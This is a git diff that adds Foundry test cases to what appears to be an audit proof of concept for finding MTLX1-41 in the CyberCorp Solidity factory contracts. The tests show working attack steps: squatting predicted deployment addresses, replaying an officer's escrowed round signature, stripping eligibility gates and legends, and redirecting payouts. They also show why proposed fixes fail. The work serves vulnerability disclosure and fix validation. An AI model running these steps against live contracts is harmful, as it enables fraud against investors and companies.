@@ -12,13 +12,15 @@ import {CyberCorpFactory} from "../src/CyberCorpFactory.sol";
 import {PumpCorpFactory} from "../src/PumpCorpFactory.sol";
 import {CyberCorpSingleFactory} from "../src/CyberCorpSingleFactory.sol";
 import {RoundManagerFactory} from "../src/RoundManagerFactory.sol";
+import {IssuanceManagerFactory} from "../src/IssuanceManagerFactory.sol";
+import {IssuanceManager} from "../src/IssuanceManager.sol";
 import {RoundManager} from "../src/RoundManager.sol";
 import {CyberCorp} from "../src/CyberCorp.sol";
 import {LedgerEntryToken} from "../src/LedgerEntryToken.sol";
 import {BorgAuth} from "../src/libs/auth.sol";
 import {CompanyOfficer, SecurityClass, SecuritySeries} from "../src/CyberCorpConstants.sol";
 import {CyberCertData, RoundType} from "../src/interfaces/IRoundManager.sol";
-import {Round} from "../src/libs/RoundLib.sol";
+import {Round, RoundLib} from "../src/libs/RoundLib.sol";
 import {CorpFactoryMetadataLib} from "../src/libs/CorpFactoryMetadataLib.sol";
 
 /// @dev Placeholder eligibility gate. Only its address matters here.
@@ -38,6 +40,8 @@ contract PassThroughCondition {
 /// Run with:
 ///   forge test --use solc:0.8.28 --via-ir --mp test/FactoryRoundAuthReplayPOC.t.sol -vv
 contract FactoryRoundAuthReplayPOCTest is Test {
+    using RoundLib for Round;
+
     uint256 internal constant SALT = 909090;
 
     uint256 internal ownerPk = 0xA11CE;
@@ -251,6 +255,262 @@ contract FactoryRoundAuthReplayPOCTest is Test {
         _deployHonestThroughPump(metadataSig);
     }
 
+    /// @notice MTLX1-41. The squat is more than a denial of service. The attacker runs the public
+    /// raw deployment on the same salt with their own officer and payout address. The stack lands
+    /// on the same predicted addresses, so the officer's escrowed signature still verifies there.
+    function test_POC_MTLX1_41_SquatterReplaysTheEscrowedSignature() public {
+        CompanyOfficer memory attackerOfficer = CompanyOfficer({
+            eoa: attacker,
+            name: "Officer A",
+            contact: "officer@corp.com",
+            title: "CEO"
+        });
+
+        vm.prank(attacker);
+        (address corp, , , , address roundManager) = pumpFactory.deployCyberCorp(
+            keccak256(abi.encodePacked(SALT)),
+            "Signed Company Name",
+            "C-Corp",
+            "DE",
+            "contact@seedcorp.com",
+            "Arbitration",
+            attacker,
+            attackerOfficer
+        );
+
+        assertEq(corp, predictedCorp, "attacker took the predicted corp address");
+        assertEq(roundManager, predictedRM, "attacker took the predicted round manager address");
+        assertEq(CyberCorp(corp).companyPayable(), attacker, "payout address is the attacker");
+
+        // The escrowed signature covers the economics only, so the attacker keeps those and
+        // substitutes the certificate configuration and drops the conditions.
+        vm.prank(attacker);
+        bytes32 roundId = RoundManager(roundManager).createRound(
+            _replayDraft(new address[](0)),
+            _attackerCertData()
+        );
+
+        Round memory created = RoundManager(roundManager).getRound(roundId);
+        assertEq(created.authorityOfficer, officer, "the round names the real officer as authority");
+        assertEq(created.roundConditions.length, 0, "the eligibility gate is gone");
+        assertEq(
+            LedgerEntryToken(created.certPrinter[0]).defaultLegend().length,
+            0,
+            "the restrictive legend is gone"
+        );
+
+        // The honest deployment can no longer run.
+        vm.expectRevert(Errors.FailedDeployment.selector);
+        _deployHonestThroughPump(_honestMetadataSignature());
+    }
+
+    /// @notice The squat does not need PumpCorpFactory. CyberCorpFactory is public too, and both
+    /// factories share the sub-factories, so one salt gives the same addresses on either path.
+    function test_POC_MTLX1_41_CyberCorpFactoryGivesTheSameSquat() public {
+        CompanyOfficer memory attackerOfficer = CompanyOfficer({
+            eoa: attacker,
+            name: "Officer A",
+            contact: "officer@corp.com",
+            title: "CEO"
+        });
+
+        vm.prank(attacker);
+        (address corp, , , , address roundManager) = corpFactory.deployCyberCorp(
+            keccak256(abi.encodePacked(SALT)),
+            "Signed Company Name",
+            "C-Corp",
+            "DE",
+            "contact@seedcorp.com",
+            "Arbitration",
+            attacker,
+            attackerOfficer
+        );
+
+        assertEq(corp, predictedCorp, "attacker took the predicted corp address");
+        assertEq(roundManager, predictedRM, "attacker took the predicted round manager address");
+        assertEq(CyberCorp(corp).companyPayable(), attacker, "payout address is the attacker");
+
+        // The escrowed signature was made for the PumpCorpFactory deployment. It verifies here.
+        vm.prank(attacker);
+        bytes32 roundId = RoundManager(roundManager).createRound(
+            _replayDraft(new address[](0)),
+            _attackerCertData()
+        );
+        assertEq(
+            RoundManager(roundManager).getRound(roundId).authorityOfficer,
+            officer,
+            "the round names the real officer as authority"
+        );
+    }
+
+    /// @notice A check that the escrowed signer owns the company does not close the replay.
+    /// The attacker owns the squatted BorgAuth, so they can appoint the real officer and keep
+    /// their own owner role at the same time.
+    function test_POC_MTLX1_41_OwnerCheckOnTheSignerIsForgeable() public {
+        CompanyOfficer memory attackerOfficer = CompanyOfficer({
+            eoa: attacker,
+            name: "Officer A",
+            contact: "officer@corp.com",
+            title: "CEO"
+        });
+
+        vm.startPrank(attacker);
+        (address corp, address auth, , , address roundManager) = pumpFactory.deployCyberCorp(
+            keccak256(abi.encodePacked(SALT)),
+            "Signed Company Name",
+            "C-Corp",
+            "DE",
+            "contact@seedcorp.com",
+            "Arbitration",
+            attacker,
+            attackerOfficer
+        );
+
+        // One call appoints the real officer and grants them the officer role.
+        CyberCorp(corp).addOfficer(_officer());
+
+        bytes32 roundId = RoundManager(roundManager).createRound(
+            _replayDraft(new address[](0)),
+            _attackerCertData()
+        );
+        vm.stopPrank();
+
+        // Both forms of the proposed check now pass on the attacker's own stack.
+        (address appointed, , , ) = CyberCorp(corp).companyOfficers(1);
+        assertEq(appointed, officer, "the real officer is an officer of the squatted corp");
+        assertGe(
+            BorgAuth(auth).userRoles(officer),
+            BorgAuth(auth).OWNER_ROLE(),
+            "the real officer holds the owner role on the squatted auth"
+        );
+
+        // The attacker still controls the corp and the payout address.
+        assertGe(BorgAuth(auth).userRoles(attacker), BorgAuth(auth).OWNER_ROLE(), "attacker is still an owner");
+        assertEq(CyberCorp(corp).companyPayable(), attacker, "payout address is still the attacker");
+        assertEq(
+            RoundManager(roundManager).getRound(roundId).authorityOfficer,
+            officer,
+            "the round still names the real officer as authority"
+        );
+    }
+
+    /// @notice Binding the payout address into the escrowed signature does not close it either.
+    /// The payout address is mutable, so the attacker satisfies the check at createRound time and
+    /// moves the payout afterwards.
+    function test_POC_MTLX1_41_PayoutAddressIsMutableAfterTheRound() public {
+        CompanyOfficer memory attackerOfficer = CompanyOfficer({
+            eoa: attacker,
+            name: "Officer A",
+            contact: "officer@corp.com",
+            title: "CEO"
+        });
+
+        vm.startPrank(attacker);
+        (address corp, , , , address roundManager) = pumpFactory.deployCyberCorp(
+            keccak256(abi.encodePacked(SALT)),
+            "Signed Company Name",
+            "C-Corp",
+            "DE",
+            "contact@seedcorp.com",
+            "Arbitration",
+            honestPayable, // the attacker deploys with the signed payout address
+            attackerOfficer
+        );
+
+        RoundManager(roundManager).createRound(_replayDraft(new address[](0)), _attackerCertData());
+        assertEq(CyberCorp(corp).companyPayable(), honestPayable, "the check would pass here");
+
+        CyberCorp(corp).setCompanyPayable(attacker);
+        vm.stopPrank();
+
+        assertEq(CyberCorp(corp).companyPayable(), attacker, "payout moved after the round exists");
+    }
+
+    /// @notice A fix inside the top-level factory is not enough while the sub-factories stay open.
+    /// The attacker builds the whole stack by hand and reaches the same predicted addresses.
+    function test_POC_MTLX1_41_SubFactoriesAloneRebuildTheSquat() public {
+        bytes32 corpSalt = keccak256(abi.encodePacked(SALT));
+        address imFactory = corpFactory.issuanceManagerFactory();
+
+        vm.startPrank(attacker);
+
+        // The attacker owns the authority from the first line. No factory writes it.
+        BorgAuth attackerAuth = new BorgAuth(attacker);
+
+        address im = IssuanceManagerFactory(imFactory).deployIssuanceManager(corpSalt);
+        address corp = CyberCorpSingleFactory(cyberCorpSingleFactory).deployCyberCorpSingle(corpSalt);
+        address rm = RoundManagerFactory(rmFactory).deployRoundManager(corpSalt);
+
+        assertEq(corp, predictedCorp, "same corp address, no top-level factory involved");
+        assertEq(rm, predictedRM, "same round manager address");
+
+        CyberCorp(corp).initialize(
+            address(attackerAuth),
+            "Signed Company Name",
+            "C-Corp",
+            "DE",
+            "contact@seedcorp.com",
+            "Arbitration",
+            im,
+            attacker,
+            CompanyOfficer({eoa: attacker, name: "Officer A", contact: "officer@corp.com", title: "CEO"}),
+            cyberCorpSingleFactory,
+            address(0)
+        );
+        IssuanceManager(im).initialize(address(attackerAuth), corp, corpFactory.uriBuilder(), imFactory);
+        RoundManager(rm).initialize(address(attackerAuth), corp, address(registry), im, rmFactory);
+
+        attackerAuth.updateRole(corp, 200);
+        attackerAuth.updateRole(im, 99);
+        attackerAuth.updateRole(rm, 99);
+        CyberCorp(corp).setRoundManager(rm);
+
+        bytes32 roundId = RoundManager(rm).createRound(_replayDraft(new address[](0)), _attackerCertData());
+        vm.stopPrank();
+
+        assertEq(
+            RoundManager(rm).getRound(roundId).authorityOfficer,
+            officer,
+            "the round names the real officer as authority"
+        );
+    }
+
+    /// @notice Why binding the officer into the salt closes the last route. To reach the honest
+    /// address the attacker must name the real officer. The deployment then grants the owner role
+    /// to that officer, and the attacker keeps none.
+    function test_POC_MTLX1_41_NamingTheRealOfficerCostsTheAttackerControl() public {
+        vm.prank(attacker);
+        (, address auth, , , address roundManager) = pumpFactory.deployCyberCorp(
+            keccak256(abi.encodePacked(SALT)),
+            "Signed Company Name",
+            "C-Corp",
+            "DE",
+            "contact@seedcorp.com",
+            "Arbitration",
+            attacker,
+            _officer() // the salt derivation would force this
+        );
+
+        assertEq(BorgAuth(auth).userRoles(attacker), 0, "the attacker holds no role");
+        assertGe(
+            BorgAuth(auth).userRoles(officer),
+            BorgAuth(auth).OWNER_ROLE(),
+            "the real officer owns the deployment"
+        );
+
+        Round memory draft = _replayDraft(new address[](0));
+        CyberCertData[] memory certData = _attackerCertData();
+        bytes memory notAuthorized = abi.encodeWithSelector(
+            BorgAuth.BorgAuth_NotAuthorized.selector,
+            BorgAuth(auth).OWNER_ROLE(),
+            attacker
+        );
+
+        vm.prank(attacker);
+        vm.expectRevert(notAuthorized);
+        RoundManager(roundManager).createRound(draft, certData);
+    }
+
     /// @dev Control: with an untouched salt the same package deploys and keeps the honest metadata.
     function test_HonestPumpPathSucceedsOnAnUntouchedSalt() public {
         bytes memory metadataSig = _honestMetadataSignature();
@@ -279,6 +539,39 @@ contract FactoryRoundAuthReplayPOCTest is Test {
     // =========================================================================
     // Helpers
     // =========================================================================
+
+    /// @dev The round the officer signed, ready to replay on a squatted RoundManager. The signed
+    /// economics stay as they are. Everything else is outside the escrowed signature.
+    function _replayDraft(address[] memory conditions) internal view returns (Round memory) {
+        return RoundLib
+            .draft()
+            .setTickets(
+                SecuritySeries.SeriesSeed,
+                RoundType.FCFS,
+                true,
+                true,
+                false,
+                RAISE_CAP,
+                TICKET,
+                TICKET,
+                address(paymentToken),
+                PRICE_PER_UNIT,
+                VALUATION,
+                startTime,
+                endTime
+            )
+            .setAgreement(
+                CyberCorpHelper.TEMPLATE_ID,
+                officer,
+                "Officer A",
+                "CEO",
+                _legalDetails(),
+                _roundPartyValues(),
+                _extensionData(),
+                conditions,
+                escrowedSig
+            );
+    }
 
     function _officer() internal view returns (CompanyOfficer memory) {
         return CompanyOfficer({
